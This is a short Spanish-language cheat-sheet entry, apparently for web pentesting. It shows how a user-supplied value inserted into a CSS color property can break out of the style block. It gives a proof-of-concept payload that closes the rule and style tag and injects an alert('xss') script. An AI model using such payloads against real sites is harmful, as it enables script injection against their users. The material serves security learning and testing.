A partir de un campo que inserte valores en atributos CSS, por ejemplo el siguiente:

```html
<style> 
	p.colorful { 
color: red
} 
</style>
```

donde **red** es nuestra insercion. Podemos inyectar el siguiente payload para derivar a XSS:

```html
red}</style><script>alert('xss')</script>
```

